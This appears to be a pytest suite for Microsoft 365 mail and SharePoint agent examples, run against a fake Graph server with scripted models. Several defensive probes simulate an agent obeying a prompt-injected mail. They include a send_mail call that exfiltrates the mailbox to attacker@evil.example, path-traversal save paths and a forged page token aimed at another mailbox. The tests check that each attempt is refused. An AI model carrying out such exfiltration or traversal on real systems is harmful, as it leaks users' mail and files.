"""The six Microsoft process examples, run offline against the local Microsoft Graph test server.

Nothing is patched: each example's shipped `blueprint.yaml` is built, its connectors (`outlook`,
`sharepoint`, the data tools of `workspace`, the calculator) reach `FakeGraph` over real HTTP, and a
scripted model follows the example's instruction (`microsoft_scripts.py`). The shipped `cases.yaml`
of every example is evaluated with deterministic scorers only. What this proves: the examples build
and run end to end, every limit holds, and the numbers and routes of the cases are right. What it
cannot prove: how a real model reads a mail or writes a draft (that is the live acceptance).
"""

from __future__ import annotations

import re
from collections.abc import Callable
from decimal import ROUND_HALF_UP, Decimal
from pathlib import Path
from typing import Any

import pytest
import yaml

from _helpers.fakegraph.server import FakeGraph
from _helpers.microsoft_scripts import (
    administration,
    approved_digest,
    outlook_briefing,
    sales_inbox,
    sales_offer,
    sharepoint_briefing,
)
from _helpers.microsoft_support import (
    EXAMPLES,
    FOLDERS,
    PROCESSES,
    SECRET,
    Project,
    Tenant,
    example_folder,
    mail_data,
    output_name,
    project_for,
    scripted,
)
from awa.blueprints import Blueprint
from awa.contracts.events import ToolResultEvent
from awa.evals import Custom, Dataset, EvalCase, evaluate
from awa.evals.report import EvalReport
from awa.evals.trace import RunTrace
from awa.tools.approval import APPROVAL_METADATA_KEY

pytestmark = pytest.mark.process

pytest.importorskip("openpyxl")

SALES_OFFER_MAILS = tuple(
    label for label in mail_data() if re.fullmatch(r"C\d\d[abc]?", label) and label != "C12"
)
SCENARIOS: dict[str, dict[str, Any]] = {
    "sharepoint-briefing": {"mailbox": "process", "mails": (), "script": sharepoint_briefing},
    "outlook-briefing": {
        "mailbox": "process",
        "mails": ("G01", "G02", "G03", "G04"),
        "script": outlook_briefing,
        "documents": False,
    },
    "approved-digest": {
        "mailbox": "process",
        "mails": ("G01", "G04"),
        "script": approved_digest,
        "send": True,
    },
    "sales-inbox": {
        "mailbox": "sales",
        "mails": ("C01", "C03", "C11", "C01-again", "S-auto"),
        "script": sales_inbox,
        "documents": False,
    },
    "sales-offer-preparation": {
        "mailbox": "sales",
        "mails": SALES_OFFER_MAILS,
        "script": sales_offer,
        "agent": "preparer",
    },
    "administration-inbox": {
        "mailbox": "administration",
        "mails": tuple(label for label in mail_data() if label.startswith("A")),
        "script": administration,
        "agent": "preparer",
    },
}


@pytest.fixture
def graph() -> Any:
    with FakeGraph() as server:
        yield server


def open_project(
    name: str, graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, **changes: Any
) -> Project:
    """The example `name` on a tenant with its synthetic mails and documents."""

    scenario = {**SCENARIOS[name], **changes}
    tenant = Tenant(graph, send=scenario.get("send", False))
    tenant.seed_mails(*scenario["mails"])
    if scenario.get("documents", True):
        tenant.seed_documents()
    return project_for(name, scenario["mailbox"], tenant, tmp_path, monkeypatch)


def model_for(
    project: Project, script: Callable[..., Any], agent: str | None = None, **options: Any
) -> Any:
    schema = output_name(project, agent) if agent else None
    return scripted(lambda replay, request: script(replay, request, **options), schema)


async def run_cases(
    project: Project,
    script: Callable[..., Any],
    agent: str | None = None,
    *,
    scorers: tuple[Any, ...] = (),
    only: tuple[str, ...] = (),
    **options: Any,
) -> EvalReport:
    """The shipped `cases.yaml` (or the cases `only` names) run on the scripted model."""

    dataset = Dataset.load(project.folder / "cases.yaml")
    if only:
        dataset = Dataset(name=dataset.name, cases=[c for c in dataset.cases if c.id in only])
    model = model_for(project, script, agent, **options)
    return await evaluate(
        lambda: project.build(model), dataset, scorers, concurrency=1, name=project.name
    )


def verdicts(report: EvalReport) -> dict[str, list[str]]:
    """The failed scores of every case that did not pass, by case id."""

    return {
        result.case_id: [f"{s.name}: {s.reason}" for s in result.scores if not s.passed]
        or [str(result.error)]
        for result in report.cases
        if result.status != "passed"
    }


# ------------------------------------------------------------------------------ what ships


@pytest.mark.parametrize("name", PROCESSES)
def test_every_example_has_a_blueprint_and_cases_that_load(name: str) -> None:
    folder = example_folder(name)
    blueprint = Blueprint.from_yaml_file(folder / "blueprint.yaml")
    assert blueprint.name == name
    # The folder the data tools read from ships with a note; only these examples have one.
    uses_workspace = "workspace" in blueprint.connectors
    assert sorted(p.name for p in folder.iterdir()) == (
        ["blueprint.yaml", "cases.yaml", *(["data"] if uses_workspace else [])]
    )
    assert uses_workspace == (folder / "data" / "README.md").is_file()
    assert len(Dataset.load(folder / "cases.yaml")) >= 3
    errors = [i for i in blueprint.check() if i.severity == "error"]
    assert not errors, errors


@pytest.mark.parametrize("name", PROCESSES)
def test_the_only_warnings_are_the_unset_credentials(name: str) -> None:
    blueprint = Blueprint.from_yaml_file(example_folder(name) / "blueprint.yaml")
    warnings = [i.message for i in blueprint.check() if i.severity == "warning"]
    assert warnings, "the check should say which variables the example needs"
    assert all("is not configured: set" in message for message in warnings), warnings


@pytest.mark.parametrize("name", PROCESSES)
def test_the_examples_use_the_outlook_sharepoint_teams_and_workspace_connectors_only(
    name: str,
) -> None:
    blueprint = Blueprint.from_yaml_file(example_folder(name) / "blueprint.yaml")
    used = {options.get("use", instance) for instance, options in blueprint.connectors.items()}
    assert used <= {"outlook", "sharepoint", "teams", "workspace"}, used
    text = (example_folder(name) / "blueprint.yaml").read_text("utf-8")
    assert "microsoft_graph" not in text
    for secret in ("AZURE_CLIENT_SECRET=", "sig=", "Bearer "):
        assert secret not in text
    # The options for the local test server exist for tests only; a shipped example never sets them.
    for option in ("allow_private_networks", "allow_http", "use_env_proxies"):
        assert option not in text


# What each example may do. Everything not listed here must not be a tool of the example.
TOOLS = {
    "sharepoint-briefing": {"files.list_children", "files.download_file"},
    "outlook-briefing": {"mail.list_messages", "mail.read_message"},
    "approved-digest": {
        "mail.list_messages",
        "mail.read_message",
        "mail.send_mail",
        "files.list_children",
        "files.download_file",
    },
    "sales-inbox": {"mail.list_messages", "mail.read_message"},
    "sales-offer-preparation": {
        "mail.list_messages",
        "mail.read_message",
        "mail.create_reply_draft",
        "files.download_file",
    },
    "administration-inbox": {
        "mail.list_messages",
        "mail.read_message",
        "mail.create_reply_draft",
        "files.download_file",
    },
}
DRAFTING = ("sales-offer-preparation", "administration-inbox")
WRITING = {"mail.send_mail", "mail.reply_to_message", "mail.move_message", "mail.mark_processed"}


@pytest.mark.parametrize("name", PROCESSES)
def test_an_example_has_exactly_the_tools_it_needs(
    name: str, graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project(name, graph, tmp_path, monkeypatch)
    agent = project.build(scripted(lambda replay, request: "ok"))
    tools = {t.name: t for t in agent.tools}
    mine = {n.replace("_", ".", 1) for n in tools if n.split("_")[0] in ("mail", "files")}
    assert mine == TOOLS[name]
    assert {n for n in mine if n in WRITING} == (WRITING & TOOLS[name])
    reading = {n for n in tools if n.startswith("workspace_")}
    assert not reading & {"workspace_write_file", "workspace_append_file", "workspace_write_csv"}
    # Every writing tool waits for a person: the digest's send and the reply drafts.
    gated = {"approved-digest": "editor", **dict.fromkeys(DRAFTING, "preparer")}
    assert project.blueprint().approval_agents() == ([gated[name]] if name in gated else [])
    assert not any((t.metadata or {}).get(APPROVAL_METADATA_KEY) for t in tools.values()) or (
        name in gated
    )


@pytest.mark.parametrize("name", PROCESSES)
def test_every_connector_is_read_only_except_the_mail_that_sends_or_drafts(name: str) -> None:
    # Belt and braces: the explicit tool list already limits the tools, `read_only` keeps a later
    # edit of that list from adding a writing tool to a connector that never needs one.
    blueprint = Blueprint.from_yaml_file(example_folder(name) / "blueprint.yaml")
    for instance, options in blueprint.connectors.items():
        writes = instance == "mail" and (name == "approved-digest" or name in DRAFTING)
        assert options.get("read_only", False) is (not writes), (name, instance)


@pytest.mark.parametrize("name", PROCESSES)
def test_schedules_stay_disabled_until_the_acceptance_runs(name: str) -> None:
    blueprint = Blueprint.from_yaml_file(example_folder(name) / "blueprint.yaml")
    assert blueprint.triggers and all(not trigger.enabled for trigger in blueprint.triggers)
    assert blueprint.automation is not None and blueprint.automation.retry.max_attempts == 1


BUDGETS = {
    "sharepoint-briefing": {"max_requests": 25, "max_total_tokens": 40_000, "max_tool_calls": 14},
    "outlook-briefing": {"max_requests": 25, "max_total_tokens": 40_000, "max_tool_calls": 14},
    "approved-digest": {"max_requests": 35, "max_total_tokens": 60_000, "max_tool_calls": 20},
    "sales-inbox": {"max_requests": 30, "max_total_tokens": 50_000, "max_tool_calls": 16},
    "sales-offer-preparation": {
        "max_requests": 80,
        "max_total_tokens": 120_000,
        "max_tool_calls": 60,
    },
    "administration-inbox": {"max_requests": 50, "max_total_tokens": 80_000, "max_tool_calls": 30},
}


@pytest.mark.parametrize("name", PROCESSES)
def test_every_example_has_a_run_budget_where_the_blueprint_format_has_limits(name: str) -> None:
    # The budget table of docs/guide/microsoft-365.md ("Run budgets"): `limits:` bounds the model calls,
    # tokens and tool calls; `defaults.max_steps` and `automation.run_timeout` stay as the second fence.
    blueprint = Blueprint.from_yaml_file(example_folder(name) / "blueprint.yaml")
    assert blueprint.defaults.max_steps <= 40
    assert blueprint.automation is not None and blueprint.automation.run_timeout is not None
    limits = blueprint.limits
    assert limits is not None, f"add to {name}: limits: {BUDGETS[name]}"
    for key, value in BUDGETS[name].items():
        assert getattr(limits, key) == value
    assert limits.max_duration is not None
    assert limits.max_duration <= blueprint.automation.run_timeout


def cases_of(name: str) -> list[dict[str, Any]]:
    found = yaml.safe_load((example_folder(name) / "cases.yaml").read_text("utf-8"))
    return list(found["cases"])


@pytest.mark.parametrize("name", PROCESSES)
def test_the_cases_check_with_numbers_and_tools_never_with_a_judge(name: str) -> None:
    blueprint = Blueprint.from_yaml_file(example_folder(name) / "blueprint.yaml")
    tool_names = {f"{instance}_{op}" for instance, op in _tool_pairs(blueprint)} | {"calculator"}
    for case in cases_of(name):
        scorers = case["scorers"]
        assert len(scorers) >= 2, case["id"]
        assert not any(s.startswith("judge") for s in scorers), case["id"]
        for scorer in scorers:
            kind, _, argument = scorer.partition(":")
            if kind in ("tool", "no_tool", "approval_granted", "approval_rejected", "no_approval"):
                assert argument in tool_names, f"{case['id']}: {scorer} names no tool of {name}"


def _tool_pairs(blueprint: Blueprint) -> list[tuple[str, str]]:
    pairs = []
    for agent in blueprint.agents:
        for reference in agent.tools:
            if reference.startswith("connector:"):
                instance, _, operation = reference.removeprefix("connector:").partition(".")
                pairs.append((instance, operation))
    return pairs


# ------------------------------------------------------------------------------ the cases run


AMOUNT = re.compile(r"\d+\.\d{2}\b")
NUMBER = re.compile(r"\d+(?:\.\d+)?")


def amounts_grounded(case: EvalCase, trace: RunTrace) -> tuple[bool, str]:
    """Every amount of a reply draft is a result of the calculator or the price list in this run.

    A model that writes a price from its memory or from a mail has no tool result to point at.
    """

    produced = {
        Decimal(number)
        for event in trace.of_type(ToolResultEvent)
        if event.tool_name in ("calculator", "workspace_query_excel") and not event.is_error
        for number in NUMBER.findall(event.content)
    }
    for call in trace.tool_calls("mail_create_reply_draft"):
        for amount in AMOUNT.findall(str(call.arguments.get("comment", ""))):
            if Decimal(amount) not in produced:
                return False, f"{amount} in a draft is no result of the calculator or the list"
    return True, "every amount of the drafts comes from a tool result"


async def probe(
    project: Project,
    script: Callable[..., Any],
    agent: str | None,
    request: str,
    *,
    decisions: tuple[dict[str, Any], ...] = (),
    **options: Any,
) -> Any:
    """One run of the example outside its case file: the case result (output, tools, approvals)."""

    case = EvalCase(id="probe", input=request, decisions=decisions)
    model = model_for(project, script, agent, **options)
    report = await evaluate(
        lambda: project.build(model), Dataset(name="probe", cases=[case]), concurrency=1
    )
    return report.cases[0]


def foreign_writes(graph: FakeGraph) -> list[tuple[str, str]]:
    """Every request that is not a read and not a sign-in: method and path."""

    return [
        (r.method, r.path) for r in graph.requests if r.method != "GET" and "/oauth2/" not in r.path
    ]


@pytest.mark.parametrize("name", PROCESSES)
async def test_the_shipped_cases_pass_with_a_model_that_follows_the_instruction(
    name: str, graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    scenario = SCENARIOS[name]
    project = open_project(name, graph, tmp_path, monkeypatch)
    extra = (Custom(amounts_grounded),) if name == "sales-offer-preparation" else ()
    report = await run_cases(project, scenario["script"], scenario.get("agent"), scorers=extra)
    assert len(report.cases) == len(cases_of(name))
    assert not verdicts(report), verdicts(report)
    assert graph.internal_errors == []
    assert SECRET not in report.model_dump_json(), "the client secret must never reach a result"
    writes = foreign_writes(graph)
    sites = [w for w in writes if "/sites/" in w[1] or "/drives/" in w[1]]
    assert not sites, "no example writes to SharePoint"
    assert not [w for w in writes if w[0] == "DELETE"], "no example deletes anything"
    if name in ("sales-offer-preparation", "administration-inbox"):
        assert writes and all(
            (m == "POST" and p.endswith("/createReply")) or m == "PATCH" for m, p in writes
        ), writes
        assert not project.tenant.sent(scenario["mailbox"]), "a draft is not a sent mail"
    elif name == "approved-digest":
        assert project.tenant.requests("POST", "users/*/messages/*/send")
    else:
        assert not writes, f"{name} only reads: {writes}"


# ------------------------------------------------------------------------------ the numbers


def decimal(value: Any) -> Decimal:
    return Decimal(str(value))


def cents(value: Decimal) -> Decimal:
    return value.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)


def price_list() -> dict[str, list[dict[str, str]]]:
    import csv

    folder = EXAMPLES / "testdata" / "price-list"
    return {
        sheet: list(csv.DictReader((folder / f"{sheet}.csv").read_text("utf-8").splitlines()))
        for sheet in ("Prices", "Discounts", "Approval", "Tax")
    }


def test_the_expected_amounts_of_the_cases_follow_from_the_price_list_in_exact_decimals() -> None:
    sheets = price_list()
    checked = 0
    for case in cases_of("sales-offer-preparation"):
        for key, expected in case["expected"].items():
            match = re.fullmatch(r"requests\.0\.lines\.(\d+)\.line_net", key)
            if not match:
                continue
            prefix = f"requests.0.lines.{match.group(1)}"
            product, quantity = (
                case["expected"][f"{prefix}.product_no"],
                case["expected"].get(f"{prefix}.quantity", 10),
            )
            [row] = [
                r
                for r in sheets["Prices"]
                if r["product_no"] == product and r["valid_to"] >= "2026-10-05" >= r["valid_from"]
            ]
            tier = max(
                (t for t in sheets["Discounts"] if int(t["min_quantity"]) <= quantity),
                key=lambda t: int(t["min_quantity"]),
            )
            net = cents(
                quantity * decimal(row["unit_price"]) * (100 - decimal(tier["discount_pct"])) / 100
            )
            rate = decimal(
                next(t["rate_pct"] for t in sheets["Tax"] if t["tax_class"] == row["tax_class"])
            )
            assert decimal(expected) == net, (case["id"], net)
            assert decimal(case["expected"][f"{prefix}.line_gross"]) == cents(
                net * (100 + rate) / 100
            ), case["id"]
            assert decimal(case["expected"][f"{prefix}.discount_pct"]) == decimal(
                tier["discount_pct"]
            )
            checked += 1
    assert checked >= 12


def test_the_approval_roles_of_the_cases_follow_from_the_approval_sheet() -> None:
    sheet = sorted(price_list()["Approval"], key=lambda r: decimal(r["up_to_pct"]))
    asked = {
        "C08b": Decimal("5.01"),
        "C09a": Decimal("15.00"),
        "C09b": Decimal("15.01"),
        "C10": Decimal("12.5"),
    }
    by_subject = {c["input"].split("'")[1]: c for c in cases_of("sales-offer-preparation")}
    for label, percent in asked.items():
        role = next(r["role"] for r in sheet if decimal(r["up_to_pct"]) >= percent)
        case = by_subject[f"Offer request {label}"]
        assert case["expected"]["requests.0.lines.0.approval_role"] == role, label


# ------------------------------------------------------------------------------ the drafts


async def test_the_offer_drafts_go_to_the_sender_only_and_hold_checked_amounts(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("sales-offer-preparation", graph, tmp_path, monkeypatch)
    report = await run_cases(project, sales_offer, "preparer", scorers=(Custom(amounts_grounded),))
    assert not verdicts(report)
    drafts = {d["id"]: d for d in project.tenant.drafts("sales")}
    made = [
        request
        for case in report.cases
        for request in case.output["requests"]
        if request["draft"] != "none"
    ]
    assert len(drafts) == len(made) == 13
    for request in made:
        draft = drafts[request["draft_id"]]
        recipients = [r["emailAddress"]["address"] for r in draft["toRecipients"]]
        assert recipients == [request["customer"]]
        assert draft["ccRecipients"] == [] and draft["isDraft"] is True
    mine = next(r for r in made if r["customer"] == "anna.keller@customer.example")
    text = drafts[mine["draft_id"]]["body"]["content"]
    assert "net 1899.05 EUR" in text and "gross 2259.87 EUR" in text


async def test_nothing_is_drafted_for_a_mail_that_gives_the_assistant_orders(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("sales-offer-preparation", graph, tmp_path, monkeypatch)
    result = await probe(
        project,
        sales_offer,
        "preparer",
        "Prepare the offer for the unread request with the subject 'Offer request C11' "
        "(prices valid on 2026-10-05).",
    )
    [request] = result.output["requests"]
    assert request["suspicious_content"] is True and request["draft"] == "none"
    assert request["lines"][0]["unit_price"] == 199.9, "the price of the mail (1.00) is ignored"
    assert not project.tenant.drafts("sales")


# ------------------------------------------------------------------------------ checks with teeth


@pytest.mark.parametrize(
    ("cheat", "must_fail"),
    [
        # decimals instead of whole cents: 9,305.345 rounds down to 9,305.34
        ("float_rounding", {"quantity-just-below-the-second-tier"}),
        # the price the mail dictates instead of the list
        ("price_from_mail", {"instruction-in-the-mail", "quantity-just-below-the-first-tier"}),
    ],
)
async def test_the_offer_checks_catch_a_model_that_breaks_a_rule(
    cheat: str,
    must_fail: set[str],
    graph: FakeGraph,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project = open_project("sales-offer-preparation", graph, tmp_path, monkeypatch)
    report = await run_cases(
        project, sales_offer, "preparer", scorers=(Custom(amounts_grounded),), cheat=cheat
    )
    failed = set(verdicts(report))
    assert must_fail <= failed, (cheat, failed)


async def test_the_administration_checks_catch_a_model_that_answers_a_sensitive_request(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("administration-inbox", graph, tmp_path, monkeypatch)
    report = await run_cases(project, administration, "preparer", cheat="answers_sensitive")
    failed = verdicts(report)
    assert {"employment-certificate-is-sensitive", "bank-details-change-is-sensitive"} <= set(
        failed
    )
    reasons = failed["bank-details-change-is-sensitive"]
    assert any("no_tool:mail_create_reply_draft" in line for line in reasons)


# ------------------------------------------------------------------------------ when things fail


async def test_an_unreadable_price_list_stops_the_run_with_the_reason_and_no_draft(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("sales-offer-preparation", graph, tmp_path, monkeypatch)
    project.tenant.files.grants.clear()  # the administrator took the site grant away
    result = await probe(
        project,
        sales_offer,
        "preparer",
        "Prepare the offer for the unread request with the subject 'Offer request C01' "
        "(prices valid on 2026-10-05).",
    )
    assert result.output["complete"] is False and result.output["requests"] == []
    [note] = result.output["notes"]
    assert "Sites.Selected" in note, "the advice of the connector reaches the model"
    assert not project.tenant.drafts("sales")


async def test_an_unreadable_list_of_responsibilities_routes_nothing(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("administration-inbox", graph, tmp_path, monkeypatch, documents=False)
    result = await probe(
        project,
        administration,
        "preparer",
        "Route the unread administration request with the subject 'Request A01' (date 2026-10-05).",
    )
    assert result.output["complete"] is False and result.output["requests"] == []
    assert not project.tenant.drafts("administration")


async def test_a_busy_inbox_is_cut_at_ten_and_the_briefing_says_so(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project(
        "sales-inbox", graph, tmp_path, monkeypatch, mails=SALES_OFFER_MAILS[:12]
    )
    result = await probe(project, sales_inbox, None, "Prepare the sales inbox for 2026-10-05.")
    assert str(result.output).startswith("Requests: 10 read, 0 failed; more unread mail: yes")


async def test_throttling_is_waited_out_and_the_briefing_is_complete(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from awa.connectors import _engine

    slept: list[float] = []
    monkeypatch.setattr(_engine, "_sleep", slept.append)  # recorded, not slept
    project = open_project("outlook-briefing", graph, tmp_path, monkeypatch)
    graph.throttle("*mailFolders/inbox/messages", retry_after=2, times=2)
    report = await run_cases(project, outlook_briefing, only=("all-unread-mail",))
    assert not verdicts(report)
    assert slept == [2.0, 2.0]


async def test_a_briefing_that_cannot_list_the_folder_says_it_is_incomplete(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("sharepoint-briefing", graph, tmp_path, monkeypatch)
    graph.fail("GET", "*children*", status=500, times=10)
    result = await probe(project, sharepoint_briefing, None, "Create the briefing for 2026-10-05.")
    assert "INCOMPLETE" in str(result.output)


async def test_a_send_with_no_clear_answer_is_never_repeated(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("approved-digest", graph, tmp_path, monkeypatch)
    project.tenant.mail.fail_after_send(504)  # the mail is sent, the answer is lost
    report = await run_cases(project, approved_digest, only=("approved",))
    [result] = report.cases
    assert "NOT SENT" in str(result.output) and "may or may not" in str(result.output)
    assert len(project.tenant.requests("POST", "users/*/messages/*/send")) == 1


# ------------------------------------------------------------------------------ a model that obeys


async def test_a_model_that_obeys_an_injected_mail_finds_no_tool_to_do_it_with(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    attempts = [
        ("mail_send_mail", {"to": ["attacker@evil.example"], "subject": "All", "body": "mailbox"}),
        ("mail_reply_to_message", {"message_id": "x", "comment": "hello"}),
        ("mail_move_message", {"message_id": "x", "folder": "deleteditems"}),
        ("mail_mark_processed", {"message_id": "x"}),
        ("files_upload_file", {"local_path": "prices/x.xlsx", "folder_path": "Approved"}),
        ("workspace_write_file", {"path": "x.txt", "content": "x"}),
    ]

    def obey(replay: Any, request: str) -> dict[str, Any]:
        outcomes = [str(replay(name, **arguments)) for name, arguments in attempts]
        return {"date": "2026-10-05", "complete": False, "requests": [], "notes": outcomes}

    project = open_project("sales-offer-preparation", graph, tmp_path, monkeypatch)
    result = await probe(project, obey, "preparer", "Process the unread requests of 2026-10-05.")
    assert result.status == "passed", result.error
    assert not foreign_writes(graph) and not project.tenant.requests("GET", "*")
    assert not project.tenant.sent("sales") and not project.tenant.drafts("sales")
    answers = result.output["notes"]
    assert all("is not a valid tool" in answer for answer in answers), answers
    assert len(answers) == len(attempts)


@pytest.mark.parametrize(
    "edited",
    [
        {"to": ["attacker@evil.example"], "subject": "Digest", "body": "everything"},
        {
            "to": ["review@company.example"],
            "cc": ["attacker@evil.example"],
            "subject": "Digest",
            "body": "x",
        },
    ],
    ids=["outside-recipient", "outside-cc"],
)
async def test_a_person_cannot_widen_the_recipients_by_editing_the_approval(
    edited: dict[str, Any], graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("approved-digest", graph, tmp_path, monkeypatch)
    result = await probe(
        project,
        approved_digest,
        None,
        "Prepare the digest for 2026-10-05 for approval. "
        "Only mail with the subject 'Invoice 2026-0412'.",
        decisions=({"action": "edit", "tool": "mail_send_mail", "args": edited},),
    )
    assert "NOT SENT" in str(result.output) and "outside allowed_domains" in str(result.output)
    assert not project.tenant.sent("process") and not foreign_writes(graph)


async def test_a_rejected_digest_sends_nothing_and_an_approved_one_exactly_once(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("approved-digest", graph, tmp_path, monkeypatch)
    report = await run_cases(project, approved_digest, only=("rejected", "approved"))
    assert not verdicts(report)
    sent = project.tenant.sent("process")
    assert len(sent) == 1
    recipients = [r["emailAddress"]["address"] for r in sent[0]["toRecipients"]]
    assert recipients == ["review@company.example"]


# ------------------------------------------------------------------------------ probes


async def test_a_model_cannot_save_a_download_outside_the_data_folder(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    attempts = ["../escape.md", "C:/escape.md", "/tmp/escape.md", ".hidden.md", "prices/../../x.md"]

    def wander(replay: Any, request: str) -> dict[str, Any]:
        notes = [
            str(replay("files_download_file", path="Approved/handbook.md", save_to=where))
            for where in attempts
        ]
        return {"date": "2026-10-05", "complete": False, "requests": [], "notes": notes}

    project = open_project("sales-offer-preparation", graph, tmp_path, monkeypatch)
    result = await probe(project, wander, "preparer", "Process the unread requests of 2026-10-05.")
    # Five refused saves in a row: the loop guard ends the run instead of letting it go on.
    assert result.status == "error" and "NoProgressError" in str(result.error), result.error
    found = sorted(p.relative_to(tmp_path).as_posix() for p in tmp_path.rglob("*escape*"))
    assert found == [] and not list(project.folder.glob("data/*.md.part"))


async def test_a_forged_page_token_cannot_point_a_listing_at_another_mailbox(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("outlook-briefing", graph, tmp_path, monkeypatch)
    forged = "https://127.0.0.1/v1.0/users/ceo@company.example/messages"

    def forge(replay: Any, request: str) -> str:
        return str(replay("mail_list_messages", page_token=forged, limit=10))

    result = await probe(project, forge, None, "Create the briefing for 2026-10-05.")
    assert "not a next_page this tool returned" in str(result.output)
    assert not project.tenant.requests("GET", "*"), "nothing was requested"


async def test_a_wrong_client_secret_fails_with_advice_and_never_echoes_the_value(
    graph: FakeGraph, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    project = open_project("outlook-briefing", graph, tmp_path, monkeypatch)
    monkeypatch.setenv("AZURE_CLIENT_SECRET", "wrong-secret-value-xyz")

    def read(replay: Any, request: str) -> str:
        return str(replay("mail_list_messages", unread_only=True, limit=10))

    result = await probe(project, read, None, "Create the briefing for 2026-10-05.")
    answer = str(result.output)
    assert answer.startswith("Error:") and "client secret" in answer.lower()
    assert "wrong-secret-value-xyz" not in answer and SECRET not in answer


def test_the_examples_readme_names_the_folder_of_every_process() -> None:
    readme = (EXAMPLES / "README.md").read_text("utf-8")
    for name in PROCESSES:
        assert f"`{FOLDERS[name]}/{name}`" in readme, name
        assert (EXAMPLES / FOLDERS[name] / name / "blueprint.yaml").is_file()
